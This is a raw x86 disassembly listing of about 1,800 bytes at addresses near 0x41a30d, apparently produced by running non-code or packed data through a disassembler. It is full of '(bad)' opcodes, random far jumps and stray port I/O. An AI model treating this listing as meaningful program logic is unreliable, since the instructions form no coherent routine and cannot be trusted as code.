  41a30d:	test   al,0x54
  41a30f:	jg     0x41a32d
  41a311:	push   esp
  41a312:	or     ch,BYTE PTR [eax+0x538f33b9]
  41a318:	dec    ebx
  41a319:	jl     0x41a301
  41a31b:	jmp    0x6011:0x5e53815b
  41a322:	in     eax,dx
  41a323:	mov    ebp,0x44a180aa
  41a328:	inc    ebp
  41a329:	adc    ebx,DWORD PTR [eax]
  41a32b:	sar    DWORD PTR [edx+0x498ef9fb],0xfd
  41a332:	pusha  
  41a333:	pop    ss
  41a334:	popa   
  41a335:	out    dx,eax
  41a336:	out    0xd2,al
  41a338:	div    DWORD PTR [edi-0xf]
  41a33b:	sbb    BYTE PTR [edi-0x4f],ah
  41a33e:	mov    esi,0xcc9e7bdd
  41a343:	inc    esi
  41a344:	jno    0x41a2fb
  41a346:	pushf  
  41a347:	pop    esp
  41a348:	rol    DWORD PTR [ebx+0x0],1
  41a34b:	cmp    al,0x5c
  41a34d:	add    cl,ch
  41a34f:	rcr    bl,cl
  41a351:	ficom  WORD PTR [eax]
  41a353:	imul   ebp,DWORD PTR [edx],0xffffffc0
  41a356:	(bad)  
  41a357:	jp     0x41a377
  41a359:	idiv   BYTE PTR [edi-0x21]
  41a35c:	ins    BYTE PTR es:[edi],dx
  41a35d:	push   ebx
  41a35e:	dec    esp
  41a35f:	mov    cl,0xf3
  41a361:	fld    TBYTE PTR [ebx+edx*2-0x56281c12]
  41a368:	mov    ebx,0x375ab7ea
  41a36d:	cs push ebx
  41a36f:	dec    ebx
  41a370:	daa    
  41a371:	sub    eax,0xa77d6260
  41a377:	out    0x25,al
  41a379:	cdq    
  41a37a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a37b:	jae    0x41a3a3
  41a37d:	and    DWORD PTR [esp+ecx*1-0x798029d6],edx
  41a384:	pop    edi
  41a385:	pop    esp
  41a386:	daa    
  41a387:	cmp    BYTE PTR es:[eax-0x46e38e35],ah
  41a38e:	fimul  DWORD PTR [ebx]
  41a390:	adc    DWORD PTR [eax],0x14
  41a393:	pop    es
  41a394:	inc    eax
  41a395:	xchg   ebx,eax
  41a396:	dec    eax
  41a397:	inc    eax
  41a398:	xor    dh,cl
  41a39a:	and    BYTE PTR [edi+0x431bd647],0xd9
  41a3a1:	sub    bh,BYTE PTR [edx*4+0x58be6ccf]
  41a3a8:	aad    0x30
  41a3aa:	mov    BYTE PTR [ecx+0x4131d6c8],0xe4
  41a3b1:	pop    ss
  41a3b2:	(bad)  
  41a3b3:	and    al,0x9b
  41a3b5:	sub    BYTE PTR [ebp-0x5cfd3337],ah
  41a3bb:	daa    
  41a3bc:	jp     0x41a395
  41a3be:	xchg   BYTE PTR [ebp+0x14072dd9],ch
  41a3c4:	push   es
  41a3c5:	call   0xb875:0x118ac7f0
  41a3cc:	pop    edi
  41a3cd:	shl    BYTE PTR [edi+0x5a],cl
  41a3d0:	aam    0x8
  41a3d2:	mov    ds:0xfdd62821,eax
  41a3d7:	imul   eax,esp,0xbd0f2d17
  41a3dd:	mov    bl,0x25
  41a3df:	popa   
  41a3e0:	mov    edi,0x2ddba266
  41a3e5:	xor    eax,0xa559494e
  41a3ea:	jne    0x41a44c
  41a3ec:	out    0xd2,al
  41a3ee:	mov    BYTE PTR [ebx],ch
  41a3f0:	jge    0x41a3bb
  41a3f2:	or     ebx,ebp
  41a3f4:	ret    0xe2c3
  41a3f7:	push   ss
  41a3f8:	and    ch,0x77
  41a3fb:	sub    al,0x79
  41a3fd:	aad    0x8d
  41a3ff:	jl     0x41a3bf
  41a401:	pop    eax
  41a402:	mov    WORD PTR [edi],fs
  41a404:	cmc    
  41a405:	push   ebp
  41a406:	xchg   esp,eax
  41a407:	add    DWORD PTR [edi+0x4],edx
  41a40a:	lea    esi,[eax]
  41a40c:	mov    edi,0x6150d2f
  41a411:	pushf  
  41a412:	jmp    0xbb879231
  41a417:	mov    cl,0xa2
  41a419:	cmp    eax,0x4da2d28
  41a41e:	xchg   ecx,eax
  41a41f:	add    al,0x24
  41a421:	adc    ecx,DWORD PTR [edx-0x4ce38c9a]
  41a427:	call   0x5ae3:0xb483d8f2
  41a42e:	ds sti 
  41a430:	ja     0x41a427
  41a432:	adc    BYTE PTR [ecx],0xbe
  41a435:	leave  
  41a436:	stos   DWORD PTR es:[edi],eax
  41a437:	mov    bh,0x7f
  41a439:	retf   0xf040
  41a43c:	je     0x41a470
  41a43e:	pop    ebp
  41a43f:	imul   edi,DWORD PTR [esi-0x69],0x9e40b01e
  41a446:	jg     0x41a434
  41a448:	into   
  41a449:	stos   DWORD PTR es:[edi],eax
  41a44a:	fstp   QWORD PTR [eax-0x7d]
  41a44d:	imul   edx,DWORD PTR [edi-0x13cc9f83],0x2c1bb4b
  41a457:	(bad)  
  41a458:	push   edi
  41a459:	retf   0x834d
  41a45c:	sub    DWORD PTR [ecx+0x48],eax
  41a45f:	or     edi,DWORD PTR ds:0x6bfb516b
  41a465:	mov    WORD PTR [ecx+0x49],ss
  41a468:	xchg   BYTE PTR [esi-0x7095368f],dh
  41a46e:	pop    ebp
  41a46f:	js     0x41a4e6
  41a471:	push   ebp
  41a472:	ja     0x41a46d
  41a474:	in     eax,0xec
  41a476:	xchg   esp,eax
  41a477:	icebp  
  41a478:	lock call 0x1b634a8e
  41a47e:	or     ebp,ecx
  41a480:	xor    BYTE PTR [eax+0x29ff230],bl
  41a486:	add    ah,BYTE PTR [ecx+0x8]
  41a489:	dec    eax
  41a48a:	sbb    DWORD PTR [eax],esp
  41a48c:	fstp   DWORD PTR [ebp+0x4e]
  41a48f:	loope  0x41a48b
  41a491:	and    BYTE PTR [edx-0x75],0xd1
  41a495:	leave  
  41a496:	retf   
  41a497:	popf   
  41a498:	ficomp DWORD PTR [edi+0x4cc291b7]
  41a49e:	int3   
  41a49f:	test   DWORD PTR [eax+0x26],edx
  41a4a2:	adc    al,0x72
  41a4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4a5:	inc    ecx
  41a4a6:	mov    dl,0xf4
  41a4a8:	outs   dx,BYTE PTR ds:[esi]
  41a4a9:	add    DWORD PTR [eax-0x3ff2ac83],edx
  41a4af:	lods   eax,DWORD PTR gs:[esi]
  41a4b1:	pop    edx
  41a4b2:	cld    
  41a4b3:	or     al,0x75
  41a4b5:	fcmovnu st,st(4)
  41a4b7:	add    BYTE PTR [ecx+0x39f4316f],al
  41a4bd:	out    0xac,eax
  41a4bf:	js     0x41a4bc
  41a4c1:	pop    ss
  41a4c2:	popf   
  41a4c3:	cmp    al,BYTE PTR [edi+0x2e]
  41a4c6:	jmp    0x2ce5:0x3a373de5
  41a4cd:	or     bh,cl
  41a4cf:	push   ecx
  41a4d0:	add    ch,BYTE PTR [ebp-0x41]
  41a4d3:	in     al,dx
  41a4d4:	repz mov dh,0x3c
  41a4d7:	aad    0x56
  41a4d9:	ret    
  41a4da:	(bad)  
  41a4db:	test   BYTE PTR [eax+ebp*4+0x7031ecc5],0xf5
  41a4e3:	adc    DWORD PTR [edx-0x80],esi
  41a4e6:	js     0x41a47b
  41a4e8:	popf   
  41a4e9:	xor    eax,0x46c9bb97
  41a4ee:	dec    eax
  41a4ef:	retf   
  41a4f0:	rcl    ch,0x20
  41a4f3:	pop    eax
  41a4f4:	push   cs
  41a4f5:	stc    
  41a4f6:	jl     0x41a4bb
  41a4f8:	push   ebp
  41a4f9:	sbb    eax,0x8bc5b4e4
  41a4fe:	scas   al,BYTE PTR es:[edi]
  41a4ff:	stos   BYTE PTR es:[edi],al
  41a500:	inc    esp
  41a501:	pop    ss
  41a502:	mov    dh,0x5d
  41a504:	lods   al,BYTE PTR ds:[esi]
  41a505:	inc    esi
  41a506:	jmp    0x3162:0xc6065610
  41a50d:	sbb    BYTE PTR [edi+0x5],dl
  41a510:	es push eax
  41a512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a513:	dec    eax
  41a514:	repnz fwait
  41a516:	mov    ebx,0x5dcad0b
  41a51b:	fild   QWORD PTR [ecx+0x78]
  41a51e:	push   cs
  41a51f:	jge    0x41a4fb
  41a521:	out    dx,al
  41a522:	in     al,dx
  41a523:	sbb    al,ah
  41a525:	inc    edi
  41a526:	loop   0x41a54d
  41a528:	mov    ds:0x7a0f16bb,eax
  41a52d:	es pop edi
  41a52f:	mov    dl,0x4e
  41a531:	cli    
  41a532:	dec    ecx
  41a533:	imul   eax,DWORD PTR [ecx-0x73],0x8f9cda35
  41a53a:	cmp    cl,BYTE PTR [ebx+edi*2-0x79b8b9b6]
  41a541:	mov    DWORD PTR [eax],ecx
  41a543:	repz scas eax,DWORD PTR es:[edi]
  41a545:	or     eax,0x21c264d1
  41a54a:	(bad)  
  41a54b:	pop    edi
  41a54c:	and    al,0x54
  41a54e:	movups XMMWORD PTR ds:[ebx-0x6dfcc037],xmm2
  41a556:	imul   eax
  41a558:	js     0x41a522
  41a55a:	ja     0x41a5c0
  41a55c:	add    cl,BYTE PTR [edi+0x5d]
  41a55f:	lods   eax,DWORD PTR ds:[esi]
  41a560:	jmp    0xe041dbb5
  41a565:	sbb    al,0x51
  41a567:	cmp    eax,0xc972423d
  41a56c:	adc    ebx,DWORD PTR [eax]
  41a56e:	mov    al,0x55
  41a570:	inc    edi
  41a571:	add    esi,esi
  41a573:	int3   
  41a574:	sub    al,0xc0
  41a576:	xchg   ebx,eax
  41a577:	jns    0x41a5bf
  41a579:	dec    ecx
  41a57a:	push   ss
  41a57b:	and    eax,0x231553b8
  41a580:	mov    fs,WORD PTR [edi-0x1b10ee74]
  41a586:	gs scas al,BYTE PTR es:[edi]
  41a588:	scas   eax,DWORD PTR es:[edi]
  41a589:	xchg   ebp,eax
  41a58a:	movsx  eax,al
  41a58d:	scas   eax,DWORD PTR es:[edi]
  41a58e:	outs   dx,BYTE PTR ds:[esi]
  41a58f:	(bad)  
  41a591:	pop    ebp
  41a592:	sbb    al,0xf9
  41a594:	add    ebp,eax
  41a596:	test   al,0x5
  41a598:	aaa    
  41a599:	sub    ah,BYTE PTR [eax+eiz*8+0x17]
  41a59d:	nop
  41a59e:	pop    edx
  41a59f:	fdiv   DWORD PTR [edx]
  41a5a1:	xor    bl,BYTE PTR [edx+0x2c390950]
  41a5a7:	(bad)  
  41a5a8:	pusha  
  41a5a9:	mov    DWORD PTR [ebx],eax
  41a5ab:	inc    edi
  41a5ac:	push   0xffffff9a
  41a5ae:	push   es
  41a5af:	fs out 0xf8,al
  41a5b2:	popa   
  41a5b3:	xlat   BYTE PTR ds:[ebx]
  41a5b4:	enter  0x79e6,0x1e
  41a5b8:	int    0xc8
  41a5ba:	adc    al,cl
  41a5bc:	pusha  
  41a5bd:	and    esi,ebp
  41a5bf:	mov    ah,0x46
  41a5c1:	data16 fist WORD PTR [esi-0x7]
  41a5c5:	enter  0x188c,0x59
  41a5c9:	in     al,dx
  41a5ca:	pop    es
  41a5cb:	or     BYTE PTR [edi+0xc1b48a8],bh
  41a5d1:	jge    0x41a5c4
  41a5d3:	mov    eax,0x3bbc3f43
  41a5d8:	xor    dh,cl
  41a5da:	add    al,0x94
  41a5dc:	or     bh,ah
  41a5de:	out    0xe5,eax
  41a5e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e1:	sub    al,0xaf
  41a5e3:	test   DWORD PTR [esi-0x133a740b],edi
  41a5e9:	cmp    ecx,esi
  41a5eb:	fadd   st,st(7)
  41a5ed:	jae    0x41a63b
  41a5ef:	jo     0x41a5c5
  41a5f1:	aas    
  41a5f2:	inc    esp
  41a5f3:	jmp    0x9f37b5a2
  41a5f8:	jg     0x41a588
  41a5fa:	out    dx,al
  41a5fb:	stos   BYTE PTR es:[edi],al
  41a5fc:	fdivp  st(3),st
  41a5fe:	aas    
  41a5ff:	xor    DWORD PTR [esi],edi
  41a601:	std    
  41a602:	div    DWORD PTR [eax+edi*1+0xc]
  41a606:	pop    ebp
  41a607:	or     esp,esp
  41a609:	xchg   ebx,eax
  41a60a:	pop    es
  41a60b:	adc    al,0xf8
  41a60e:	in     al,0x99
  41a610:	cdq    
  41a611:	jmp    0xd6ddeefc
  41a616:	mov    ebp,0xe82b87f2
  41a61b:	mov    bl,0x1
  41a61d:	cli    
  41a61e:	cld    
  41a61f:	das    
  41a620:	adc    dh,BYTE PTR [edi-0x4ab91cfa]
  41a626:	lods   al,BYTE PTR ds:[esi]
  41a627:	lds    edi,FWORD PTR [ecx-0xfba7464]
  41a62d:	addr16 cmc 
  41a62f:	or     ah,BYTE PTR [esi+edx*8]
  41a632:	mov    dl,0xdb
  41a634:	ss ins DWORD PTR es:[edi],dx
  41a636:	dec    ebp
  41a637:	and    DWORD PTR [edx+0x2c],ebx
  41a63a:	out    0xd1,eax
  41a63c:	retf   0x4950
  41a63f:	push   esp
  41a640:	and    ah,0x44
  41a643:	mov    al,0x97
  41a645:	inc    edi
  41a646:	push   edi
  41a647:	cmp    DWORD PTR [ebx-0x41d201f],esi
  41a64d:	ins    DWORD PTR es:[edi],dx
  41a64e:	xchg   esi,eax
  41a64f:	pop    eax
  41a650:	sub    al,0x25
  41a652:	inc    esp
  41a654:	add    al,0xb9
  41a656:	sbb    ah,BYTE PTR [eax+0x38c32b]
  41a65c:	adc    eax,0x77fa90e0
  41a661:	cmc    
  41a662:	and    cl,BYTE PTR [ebx-0x6]
  41a665:	bound  ebp,QWORD PTR [ecx+0x2335458c]
  41a66b:	cld    
  41a66c:	mov    ebx,0xfa808b1f
  41a671:	loopne 0x41a644
  41a673:	fwait
  41a674:	pop    ds
  41a675:	(bad)  
  41a676:	imul   ebx,DWORD PTR [edi],0x6d
  41a679:	adc    cl,dl
  41a67b:	cwde   
  41a67c:	mul    BYTE PTR [ecx+0x4b]
  41a67f:	mov    ebx,0x1a0e06fb
  41a684:	popa   
  41a685:	aaa    
  41a686:	pushf  
  41a687:	inc    ebp
  41a688:	not    ah
  41a68a:	dec    esp
  41a68b:	clc    
  41a68c:	out    dx,al
  41a68d:	mov    ds,WORD PTR [edi+0x61]
  41a690:	sbb    edi,edi
  41a692:	inc    edi
  41a693:	xchg   ecx,eax
  41a695:	inc    ecx
  41a696:	in     eax,dx
  41a697:	int    0xd3
  41a699:	inc    ebp
  41a69a:	adc    al,0xe9
  41a69c:	data16 gs jb 0x41a691
  41a6a0:	sbb    cl,BYTE PTR [ebp+0x45]
  41a6a3:	sbb    eax,0x9e0c7ca9
  41a6a8:	(bad)  
  41a6aa:	push   0x62
  41a6ac:	adc    ah,ah
  41a6ae:	pushf  
  41a6af:	push   edi
  41a6b0:	pop    ebp
  41a6b1:	lods   eax,DWORD PTR ds:[esi]
  41a6b2:	xchg   edi,eax
  41a6b3:	(bad)  
  41a6b4:	xor    eax,0x85a97676
  41a6b9:	ins    BYTE PTR es:[edi],dx
  41a6ba:	popa   
  41a6bb:	push   esi
  41a6bc:	fcomi  st,st(4)
  41a6be:	mov    edx,0x627ca7b5
  41a6c3:	inc    esp
  41a6c4:	fstp   DWORD PTR [edx+0x42]
  41a6c7:	sti    
  41a6c8:	sub    ebx,DWORD PTR [edx-0x48e74048]
  41a6ce:	push   edi
  41a6cf:	sbb    al,bh
  41a6d1:	mov    ds,WORD PTR [edi]
  41a6d3:	xor    al,0xa4
  41a6d5:	and    eax,0x7a2a715e
  41a6da:	dec    edx
  41a6db:	(bad)  
  41a6dc:	jg     0x41a70e
  41a6de:	mov    edi,0x79742eb5
  41a6e3:	add    al,ah
  41a6e5:	cdq    
  41a6e6:	sahf   
  41a6e7:	xchg   edx,eax
  41a6e8:	clc    
  41a6e9:	sub    BYTE PTR [edi+ecx*8],cl
  41a6ec:	aam    0xf0
  41a6ee:	sbb    esp,esi
  41a6f0:	sub    BYTE PTR [esi+eiz*4+0x22],ah
  41a6f4:	lds    edx,FWORD PTR [ecx-0x4bc1f341]
  41a6fa:	xor    DWORD PTR [ebx+0x6c],esp
  41a6fd:	cmp    dh,BYTE PTR [edx]
  41a6ff:	cdq    
  41a700:	cmp    ch,bh
  41a702:	aaa    
  41a703:	in     al,0x45
  41a705:	rol    ch,0x57
  41a708:	add    edx,esi
  41a70a:	pop    es
  41a70b:	mov    WORD PTR [ecx],?
  41a70d:	jg     0x41a783
  41a70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a710:	dec    ebx
  41a711:	jecxz  0x41a789
  41a713:	inc    ebp
  41a714:	cmp    al,dh
  41a716:	inc    ebp
  41a717:	ins    DWORD PTR es:[edi],dx
  41a718:	or     DWORD PTR [edx-0x6ef813a7],esi
  41a71e:	frstor [eax]
  41a720:	mov    ecx,0xe959f08a
  41a725:	ds jbe 0x41a76c
  41a728:	mov    ecx,0x3642e40d
  41a72d:	jmp    0x41a70e
  41a72f:	inc    DWORD PTR [esi]
  41a731:	or     DWORD PTR [eax+0x57384de7],0x3e802fcf
  41a73b:	cmp    cl,dl
  41a73d:	std    
  41a73e:	dec    esp
  41a73f:	gs addr16 add cl,ah
  41a743:	std    
  41a744:	sbb    eax,DWORD PTR [eax]
  41a746:	pop    ecx
  41a747:	cmp    al,0xe7
  41a749:	sbb    ah,BYTE PTR [ecx+ecx*1-0x3b]
  41a74d:	fwait
  41a74e:	jmp    0xe214:0x6784680
  41a755:	scas   al,BYTE PTR es:[edi]
  41a756:	jge    0x41a760
  41a758:	leave  
  41a759:	jmp    0x472f:0x84e75069
  41a760:	push   es
  41a761:	fimul  DWORD PTR [ebx]
  41a763:	mov    bh,BYTE PTR [ecx-0x7e]
  41a766:	dec    ebx
  41a767:	mov    ebx,0x760b24bd
  41a76c:	dec    eax
  41a76d:	jns    0x41a785
  41a76f:	(bad)  
  41a770:	jmp    0x41a7c7
  41a772:	xor    al,0x52
  41a774:	stos   DWORD PTR es:[edi],eax
  41a775:	aam    0x44
  41a777:	sub    al,0x9
  41a779:	dec    esi
  41a77a:	shr    BYTE PTR [edi+0x11],1
  41a77d:	scas   al,BYTE PTR es:[edi]
  41a77e:	jecxz  0x41a743
  41a780:	push   es
  41a781:	neg    ah
  41a783:	inc    esi
  41a784:	xor    ebp,DWORD PTR ds:[esi+0x45b44978]
  41a78b:	nop
  41a78c:	jne    0x41a7c0
  41a78e:	ja     0x41a772
  41a790:	adc    DWORD PTR [ecx+0x3b],eax
  41a793:	sub    ch,BYTE PTR [ebx]
  41a795:	sbb    eax,0x81d06497
  41a79a:	ds sub al,0x97
  41a79d:	mov    esi,0xc2a2fb93
  41a7a2:	xchg   ecx,eax
  41a7a3:	stos   DWORD PTR es:[edi],eax
  41a7a4:	sbb    al,0x72
  41a7a6:	and    DWORD PTR [edx+0x23],esp
  41a7a9:	jg     0x41a800
  41a7ab:	pop    ss
  41a7ac:	ins    BYTE PTR es:[edi],dx
  41a7ad:	ins    BYTE PTR es:[edi],dx
  41a7ae:	pmovmskb ebx,mm6
  41a7b1:	dec    esi
  41a7b2:	fwait
  41a7b3:	std    
  41a7b4:	fwait
  41a7b5:	or     BYTE PTR [edi+ecx*1+0x403e29e8],ah
  41a7bc:	and    bl,BYTE PTR [ebx]
  41a7be:	push   ebx
  41a7bf:	xor    al,0x69
  41a7c1:	icebp  
  41a7c2:	call   0xa363:0x12acf6ea
  41a7c9:	jge    0x41a7ac
  41a7cb:	repnz ins BYTE PTR es:[edi],dx
  41a7cd:	shl    DWORD PTR [eax-0x23308e8c],cl
  41a7d3:	fwait
  41a7d4:	lahf   
  41a7d5:	(bad)  
  41a7d7:	adc    BYTE PTR [edi],cl
  41a7d9:	dec    ebx
  41a7da:	(bad)  
  41a7db:	hlt    
  41a7dc:	cli    
  41a7dd:	pop    ecx
  41a7de:	xchg   esp,eax
  41a7df:	push   edx
  41a7e0:	pushf  
  41a7e1:	cvttps2pi mm7,QWORD PTR [esi+0x75]
  41a7e5:	ins    DWORD PTR es:[edi],dx
  41a7e6:	rol    esp,1
  41a7e8:	repz push ds
  41a7ea:	jbe    0x41a7af
  41a7ec:	stos   BYTE PTR es:[edi],al
  41a7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ee:	out    0xab,al
  41a7f0:	out    0x9,al
  41a7f2:	inc    edx
  41a7f3:	out    0x2d,al
  41a7f5:	xchg   ebp,eax
  41a7f6:	push   ecx
  41a7f7:	scas   al,BYTE PTR es:[edi]
  41a7f8:	cmp    al,0xd9
  41a7fa:	arpl   WORD PTR [eax],di
  41a7fc:	xor    ebp,DWORD PTR [ebx-0x1e6a9cab]
  41a802:	hlt    
  41a803:	jge    0x41a7de
  41a805:	inc    edx
  41a806:	sbb    al,0xa
  41a808:	loop   0x41a7bd
  41a80a:	push   ds
  41a80b:	cmp    al,0xbf
  41a80d:	dec    ebp
  41a80e:	fcom   QWORD PTR [eax]
  41a810:	ret    0x809c
  41a813:	iret   
  41a814:	pop    ds
  41a815:	out    dx,al
  41a816:	stc    
  41a817:	jns    0x41a830
  41a819:	(bad)  
  41a81a:	and    al,0xdc
  41a81c:	or     DWORD PTR [eax+eax*2+0x56],ecx
  41a820:	push   0x1d7ab0dd
  41a825:	out    dx,eax
  41a826:	mov    cl,0x74
  41a828:	add    al,0x3f
  41a82a:	stos   DWORD PTR es:[edi],eax
  41a82b:	scas   eax,DWORD PTR es:[edi]
  41a82c:	repnz leave 
  41a82e:	fistp  WORD PTR [ebx]
  41a830:	hlt    
  41a831:	js     0x41a83c
  41a833:	mov    ds:0x5ef7691d,eax
  41a838:	cli    
  41a839:	cs cld 
  41a83b:	stos   DWORD PTR es:[edi],eax
  41a83c:	mov    ebp,0xa725eaed
  41a841:	dec    ecx
  41a842:	cmp    eax,0x4bbedada
  41a847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a848:	push   eax
  41a849:	mov    ebx,0x4102ea61
  41a84e:	or     al,0x6d
  41a850:	sub    BYTE PTR [edi*1-0x362d27a8],cl
  41a857:	mov    bh,0x5b
  41a859:	push   0x52
  41a85b:	jbe    0x41a866
  41a85d:	dec    edx
  41a85e:	mov    ah,0x58
  41a860:	hlt    
  41a861:	dec    esp
  41a862:	dec    edx
  41a863:	les    edi,FWORD PTR [ebp-0x7e]
  41a866:	jmp    0x8f3abe54
  41a86b:	mov    ds:0xfcc36b32,al
  41a870:	(bad)  
  41a871:	xchg   ecx,eax
  41a872:	outs   dx,BYTE PTR ds:[esi]
  41a873:	into   
  41a874:	cld    
  41a875:	inc    esp
  41a876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a877:	rcr    ah,1
  41a879:	xor    ebp,DWORD PTR [ebx-0x5cf3f024]
  41a87f:	cmp    dh,ch
  41a881:	data16 data16 mov bl,0x16
  41a885:	rcr    al,1
  41a887:	(bad)  
  41a888:	rcr    DWORD PTR [ebx+0x62],cl
  41a88b:	cli    
  41a88c:	or     eax,0x2bf424d8
  41a891:	pop    edx
  41a892:	ds push eax
  41a894:	call   0xbbaf:0x29744b4f
  41a89b:	fldcw  WORD PTR [eax+0x13721a88]
  41a8a1:	jmp    0x41a8a7
  41a8a3:	scas   al,BYTE PTR es:[edi]
  41a8a4:	jb     0x41a846
  41a8a6:	push   0x415e6f0a
  41a8ab:	test   al,0x86
  41a8ad:	enter  0x3268,0x4a
  41a8b1:	or     DWORD PTR [esi-0x2b135638],ebx
  41a8b7:	shl    bh,0x64
  41a8ba:	retf   
  41a8bb:	and    ebx,DWORD PTR [edx+0x6287dfcb]
  41a8c1:	push   esp
  41a8c2:	and    BYTE PTR [esi],dh
  41a8c4:	mov    cl,0xc3
  41a8c6:	sub    BYTE PTR [ebp+0x1d],al
  41a8c9:	inc    esp
  41a8cb:	jecxz  0x41a8b7
  41a8cd:	jbe    0x41a8b8
  41a8cf:	mov    al,ds:0x8ec7cf18
  41a8d4:	ret    0x9159
  41a8d7:	(bad)  
  41a8d8:	ss xchg edx,eax
  41a8da:	push   edx
  41a8db:	mov    esp,0xe471b8a3
  41a8e0:	xchg   edx,eax
  41a8e1:	add    eax,0x572f2749
  41a8e6:	or     cl,bh
  41a8e8:	addr16 (bad) 
  41a8ea:	pop    edi
  41a8eb:	cmp    bh,ah
  41a8ed:	cdq    
  41a8ee:	ret    
  41a8ef:	cli    
  41a8f0:	icebp  
  41a8f1:	rcr    DWORD PTR [ebx+0x788a3f34],cl
  41a8f7:	sbb    BYTE PTR [eax+0x14b35136],0xd7
  41a8fe:	push   edi
  41a8ff:	cmp    DWORD PTR [eax-0x407e3227],0x3d0655b9
  41a909:	(bad)  
  41a90a:	pop    ebp
  41a90b:	das    
  41a90c:	dec    eax
  41a90d:	stos   BYTE PTR es:[edi],al
  41a90e:	dec    esp
  41a90f:	jb     0x41a8cc
  41a911:	int3   
  41a912:	and    esi,edx
  41a914:	add    ch,bh
  41a916:	xchg   esp,eax
  41a917:	push   esi
  41a918:	mov    bh,0xcb
  41a91a:	leave  
  41a91b:	adc    DWORD PTR [eax],0xaf15ae17
  41a921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a922:	inc    ecx
  41a923:	int    0x3f
  41a925:	sub    DWORD PTR [esi-0x3470a44e],ecx
  41a92b:	or     al,0x16
  41a92d:	std    
  41a92e:	fbld   TBYTE PTR [ebp-0x20]
  41a931:	mov    ebp,ebx
  41a933:	(bad)  
  41a934:	scas   al,BYTE PTR es:[edi]
  41a935:	mov    DWORD PTR [eax-0x76d0049f],edi
  41a93b:	mov    al,ds:0xa54223e4
  41a940:	or     BYTE PTR [ecx+0x56],dh
  41a943:	das    
  41a944:	pop    ebp
  41a945:	call   DWORD PTR [edx-0x28]
  41a948:	cli    
  41a949:	and    cl,cl
  41a94b:	popf   
  41a94c:	jno    0x41a996
  41a94e:	pusha  
  41a94f:	and    al,BYTE PTR [ecx]
  41a951:	sbb    edx,DWORD PTR [esp+edi*4-0x17]
  41a955:	jb     0x41a8d7
  41a957:	jne    0x41a92c
  41a959:	inc    BYTE PTR [ecx+0x59d347bf]
  41a95f:	mov    cl,0x23
  41a961:	xor    edx,DWORD PTR [ecx]
  41a963:	icebp  
  41a964:	jb     0x41a952
  41a966:	mov    ?,WORD PTR [ecx-0x3db41854]
  41a96c:	mov    eax,ds:0x533498e9
  41a971:	(bad)  
  41a972:	cmp    DWORD PTR [esi+esi*1],eax
  41a975:	mov    cl,0x68
  41a977:	shl    DWORD PTR es:[edi+0x6701b9d2],1
  41a97e:	mov    ebp,0x8174d891
  41a983:	pop    ds
  41a984:	sub    eax,0x89331aea
  41a989:	mov    bh,0x70
  41a98b:	jecxz  0x41a932
  41a98d:	je     0x41a930
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	stos   BYTE PTR es:[edi],al
  41a991:	add    eax,0xbcf8ea8a
  41a996:	cmp    eax,0xaf5f170b
  41a99b:	xchg   ebx,eax
  41a99c:	js     0x41a981
  41a99e:	mov    bl,0xea
  41a9a0:	popf   
  41a9a1:	add    al,0x11
  41a9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9a4:	sbb    BYTE PTR [edi],0xb5
  41a9a7:	push   esp
  41a9a8:	jl     0x41a9c2
  41a9aa:	fidivr DWORD PTR [edi-0x2ff2bf5c]
  41a9b0:	mov    ah,0xf7
  41a9b2:	pusha  
  41a9b3:	sub    eax,0x732c1c9e
  41a9b8:	mov    ecx,0x82b4b272
  41a9bd:	jg     0x41a9d6
  41a9bf:	into   
  41a9c0:	fstp   TBYTE PTR [esi+0x47]
  41a9c3:	fwait
  41a9c4:	gs in  al,dx
  41a9c6:	jmp    0xa031310c
  41a9cb:	data16 idiv BYTE PTR [edi]
  41a9ce:	add    BYTE PTR [eax+0x2c],bh
  41a9d1:	cli    
  41a9d2:	pop    es
  41a9d3:	into   
  41a9d4:	or     eax,0xe22c3f98
  41a9d9:	(bad)  
  41a9da:	sub    edi,ebx
  41a9dc:	out    0x22,eax
  41a9de:	(bad)  
  41a9df:	loope  0x41aa5e
  41a9e1:	imul   esi,ebp,0xc16b4dcf
  41a9e7:	adc    ebx,DWORD PTR [esi+0x795f963d]
  41a9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9ee:	fdiv   st(3),st
  41a9f0:	pushf  
  41a9f1:	fisub  DWORD PTR ds:0xa0e2fbd6
  41a9f7:	rol    esp,1
  41a9f9:	add    esi,DWORD PTR [edi]
  41a9fb:	repz or BYTE PTR [ecx],0xac
  41a9ff:	mov    edi,edi
  41aa01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa02:	test   eax,0xcf850aa6
  41aa07:	and    ebx,DWORD PTR [eax+0x739cc6fc]
  41aa0d:	test   DWORD PTR [ebx+0x4d1a9543],ecx
  41aa13:	daa    
  41aa14:	scas   al,BYTE PTR es:[edi]
  41aa15:	cmc    
  41aa16:	(bad)  
  41aa17:	cli    
  41aa18:	leave  
  41aa19:	int    0xb4
  41aa1b:	addr16 xchg esi,eax
  41aa1d:	cmp    al,0x55
  41aa1f:	loope  0x41a9cd
  41aa21:	cmp    BYTE PTR [edx],dl
  41aa23:	nop
  41aa24:	leave  
  41aa25:	bound  edi,QWORD PTR [edi]
  41aa27:	push   ss
  41aa28:	sub    dl,BYTE PTR [edx]
  41aa2a:	cmp    eax,0x1e0f8d72
  41aa2f:	adc    DWORD PTR ds:[ecx],ebp
  41aa32:	das    
  41aa33:	ins    BYTE PTR es:[edi],dx
  41aa34:	in     al,0x17
  41aa36:	je     0x41aa6d
  41aa38:	pop    eax
  41aa39:	sbb    dl,BYTE PTR [ebp+eiz*2-0x12a3ecd7]
  41aa40:	xchg   DWORD PTR gs:[esi],esi
  41aa43:	or     ebp,ebp
  41aa45:	lods   al,BYTE PTR ds:[esi]
  41aa46:	test   al,0x3
  41aa48:	jmp    0xdfa0:0xbf24b4ec
  41aa4f:	add    al,0x18
